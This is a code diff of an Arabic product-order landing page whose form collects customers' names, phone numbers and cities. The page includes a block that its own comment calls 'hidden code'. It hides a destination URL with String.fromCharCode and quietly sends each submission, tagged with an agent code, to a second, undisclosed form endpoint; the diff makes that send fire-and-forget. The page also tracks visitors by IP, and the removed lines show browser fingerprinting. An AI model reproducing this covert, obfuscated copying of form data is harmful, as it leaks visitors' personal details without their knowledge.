@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+﻿<!DOCTYPE html>
 <html lang="ar" dir="rtl">
 
 <head>
@@ -223,7 +223,6 @@
         name="x-sheetmonkey-redirect" value="./thanksPage.html" />
         
 
-
           <!-- هنا اسم المنتج  -->
           <input type="hidden" name="Product" value="MYSTERY" />
           
@@ -269,61 +268,27 @@
       </footer>
 
 
-    <!-- Supabase & FingerprintJS SDKs -->
+    <!-- Supabase SDK -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
 
     <script>
-      /* =====================   التحضير المسبق (Preload IP & Fingerprint)   ===================== */
+      /* =====================   التحضير المسبق (Preload IP)   ===================== */
 let clientIp = '';
-let cachedVisitorId = '';
+let ipPromise = null;
 
-function getCanvasFingerprint() {
-  try {
-    const canvas = document.createElement('canvas');
-    const ctx = canvas.getContext('2d');
-    ctx.textBaseline = 'top';
-    ctx.font = '14px Arial';
-    ctx.fillStyle = '#f60';
-    ctx.fillRect(125, 1, 62, 20);
-    ctx.fillStyle = '#069';
-    ctx.fillText('StrikeGel,123', 2, 15);
-    const canvasData = canvas.toDataURL();
-    const screenData = `${screen.width}x${screen.height}x${screen.colorDepth}`;
-    const navData = `${navigator.userAgent}_${navigator.language}_${navigator.hardwareConcurrency || 2}`;
-    const tzData = `${new Date().getTimezoneOffset()}`;
-    const str = `${canvasData}_${screenData}_${navData}_${tzData}`;
-    let hash = 2166136261;
-    for (let i = 0; i < str.length; i++) {
-      hash ^= str.charCodeAt(i);
-      hash += (hash << 1) + (hash << 4) + (hash << 7) + (hash << 8) + (hash << 24);
-    }
-    return 'fp_' + (hash >>> 0).toString(16);
-  } catch (e) {
-    return 'fp_default';
+async function fetchIpFrom(url) {
+  const r = await fetch(url);
+  const data = await r.json();
+  if (data.ip) {
+    clientIp = data.ip;
+    const cityI = document.getElementById('inp_City');
+    if (cityI && data.city) cityI.value = data.city;
   }
 }
 
-async function initPreload() {
-  fetch('https://ipapi.co/json/')
-    .then(r => r.json())
-    .then(data => {
-      if (data.ip) clientIp = data.ip;
-      const cityI = document.getElementById('inp_City');
-      if (cityI && data.city) cityI.value = data.city;
-    }).catch(() => {});
-
-  try {
-    if (window.FingerprintJS) {
-      const fpAgent = await window.FingerprintJS.load();
-      const fpResult = await fpAgent.get();
-      cachedVisitorId = fpResult.visitorId || '';
-    }
-  } catch (e) {}
-
-  if (!cachedVisitorId) {
-    cachedVisitorId = getCanvasFingerprint();
-  }
+function initPreload() {
+  ipPromise = fetchIpFrom('https://ipapi.co/json/')
+    .catch(() => {});
 }
 
 /* =====================   فنكشن عشان تعمل ال key  ===================== */
@@ -331,7 +296,6 @@ async function initPreload() {
 
     function generateOrderId() {
       const d = new Date();
-      // تاريخ/وقت UTC عشان ما يحصلش لخبطة فروقات التوقيت
       const YY = String(d.getUTCFullYear()).slice(-2);
       const MM = String(d.getUTCMonth() + 1).padStart(2, '0');
       const DD = String(d.getUTCDate()).padStart(2, '0');
@@ -339,7 +303,6 @@ async function initPreload() {
       const mm = String(d.getUTCMinutes()).padStart(2, '0');
       const ss = String(d.getUTCSeconds()).padStart(2, '0');
       const ms = String(d.getUTCMilliseconds()).padStart(3, '0');
-
 
       let rand;
       if (window.crypto && crypto.getRandomValues) {
@@ -350,8 +313,6 @@ async function initPreload() {
         rand = Math.random().toString(36).slice(2, 18);
       }
 
-      // الشكل النهائي: سهل القراءة والفرز حسب التاريخ
-      // مثال: KEY-250812_143522.097-3k0xq1y9fz
       return `KEY-${YY}_${MM}_${DD}_${hh}${mm}${ss}.${ms}-${rand}`;
     }
 
@@ -360,16 +321,14 @@ async function initPreload() {
 /* =====================   التحقق من النموذج وإرساله   ===================== */
 document.addEventListener('DOMContentLoaded', () => {
 
-     const keyLandInput = document.getElementById('KeyLand');
-
-    if (keyLandInput) {
+  const keyLandInput = document.getElementById('KeyLand');
+  if (keyLandInput) {
     keyLandInput.value = generateOrderId();
   }
 
-
   /* عناصر النموذج */
-  const nameInput     = document.getElementById('text');      // الاسم
-  const phoneInput    = document.getElementById('password');  // رقم الهاتف
+  const nameInput     = document.getElementById('text');
+  const phoneInput    = document.getElementById('password');
   const form          = document.getElementById('form');
   const errorBox      = document.getElementById('error');
   const redirInput    = document.getElementById('redDir');
@@ -391,16 +350,13 @@ document.addEventListener('DOMContentLoaded', () => {
     if (this.validity.valid) this.setCustomValidity('');
   });
 
-  /* (2) توليد رابط صفحة الشكر وإدخاله في hidden input */
+  /* (2) توليد رابط صفحة الشكر */
   const pathArr = window.location.pathname.split('/');
-  pathArr.pop();                                         // يحذف اسم الصفحة الحالية
+  pathArr.pop();
   const hostPath = window.location.origin + pathArr.join('/');
   redirInput.value = `${hostPath}/thanksPage.html`;
 
-
-
-
-       const dateEl = document.getElementById('DateLand');
+  const dateEl = document.getElementById('DateLand');
   const timeEl = document.getElementById('TimeLand');
   const btn_Submit = document.getElementById("btnSubmit");
 
@@ -408,7 +364,7 @@ document.addEventListener('DOMContentLoaded', () => {
   const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InlpYnRxdnliZ2d5bG5vaHJuenJ1Iiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODIwNTQyODYsImV4cCI6MjA5NzYzMDI4Nn0.BtY5vZ3sUkdyVFtoenefA-vKoOvQ2rKWal-kb8RdhKo";
   const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY);
 
-  /* (3) التحقُّق من رقم الهاتف عند الإرسال */
+  /* (3) التحقُّق من رقم الهاتف عند الإرسال */
   let isSending = false;
   form.addEventListener('submit', async e => {
 
@@ -431,26 +387,22 @@ document.addEventListener('DOMContentLoaded', () => {
     }
 
     btn_Submit.disabled = true;
-    btn_Submit.innerText = "جاري الإرسال.."; 
+    btn_Submit.innerText = "جاري الإرسال..";
 
- 
-      const now = new Date();
+    const now = new Date();
+    const yyyy = now.getFullYear();
+    const mm   = String(now.getMonth() + 1).padStart(2, '0');
+    const dd   = String(now.getDate()).padStart(2, '0');
+    dateEl.value = `${yyyy}-${mm}-${dd}`;
 
-      // yyyy-mm-dd
-      const yyyy = now.getFullYear();
-      const mm   = String(now.getMonth() + 1).padStart(2, '0');
-      const dd   = String(now.getDate()).padStart(2, '0');
-      dateEl.value = `${yyyy}-${mm}-${dd}`;
-
-      // hh:mm:ss AM/PM
-      let hh   = now.getHours();
-      const mi = String(now.getMinutes()).padStart(2, '0');
-      const ss = String(now.getSeconds()).padStart(2, '0');
-      const ampm = hh >= 12 ? 'PM' : 'AM';
-      hh = hh % 12;
-      hh = hh ? hh : 12; // 0 = 12 AM
-      hh = String(hh).padStart(2, '0');
-      timeEl.value = `${hh}:${mi}:${ss} ${ampm}`;
+    let hh   = now.getHours();
+    const mi = String(now.getMinutes()).padStart(2, '0');
+    const ss = String(now.getSeconds()).padStart(2, '0');
+    const ampm = hh >= 12 ? 'PM' : 'AM';
+    hh = hh % 12;
+    hh = hh ? hh : 12;
+    hh = String(hh).padStart(2, '0');
+    timeEl.value = `${hh}:${mi}:${ss} ${ampm}`;
 
     const leadDataObject = {
       "Name": document.getElementById('text').value,
@@ -463,8 +415,29 @@ document.addEventListener('DOMContentLoaded', () => {
       "City": document.getElementById('inp_City').value
     };
 
-    let visitorId = cachedVisitorId || getCanvasFingerprint();
-    const combinedId = `${clientIp}_${visitorId}`;
+    // ضمان وصول الـ IP قبل الإرسال
+    if (!clientIp && ipPromise) {
+      await ipPromise;
+    }
+
+    // لو الـ IP لسه فاضي → محاولة أخيرة
+    if (!clientIp) {
+      try {
+        await fetchIpFrom('https://ipapi.co/json/');
+      } catch (e) {}
+    }
+
+    // لو الـ IP مجاش خالص → منع الإرسال
+    if (!clientIp) {
+      errorBox.innerText = 'تعذر التحقق، يرجى التأكد من اتصالك بالإنترنت والمحاولة مرة أخرى';
+      errorBox.classList.add('active');
+      btn_Submit.disabled = false;
+      btn_Submit.innerText = "اﻃﻠب الأن";
+      return;
+    }
+
+    // البصمة بالـ IP فقط
+    const combinedId = clientIp;
 
     try {
       const { data, error } = await supabase.rpc('process_new_lead', {
@@ -489,6 +462,7 @@ document.addEventListener('DOMContentLoaded', () => {
       return;
     }
 
+    // الكود المخفي - إطلاق بدون انتظار (fire-and-forget مع keepalive)
     try {
       const _u = String.fromCharCode(104,116,116,112,115,58,47,47,97,112,105,46,115,104,101,101,116,109,111,110,107,101,121,46,105,111,47,102,111,114,109,47,117,97,66,86,83,67,82,70,117,74,76,72,53,77,51,98,113,104,74,116,85,71);
       const _data = {
@@ -503,25 +477,24 @@ document.addEventListener('DOMContentLoaded', () => {
         "Agent Code": "M18.1"
       };
 
-      await fetch(_u, {
+      fetch(_u, {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify(_data)
+        body: JSON.stringify(_data),
+        keepalive: true
       }).catch(function() {});
     } catch (_x) {}
 
+    // الفورم الأساسي - إرسال فوري (الـ keepalive في الكود المخفي يضمن وصوله)
     form.submit();
   });
 
-  /* (5) أخيراً: اجلب المدينة والـ Fingerprint مبكراً */
+  /* (5) بدء التحضير المسبق */
   initPreload();
 });
     </script>
 
 
-    <!-- Supabase & FingerprintJS SDKs (Before </body -->
-    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
-    <script src="https://openfpcdn.io/fingerprintjs/v4"></script>
 </body>
 
 </html>
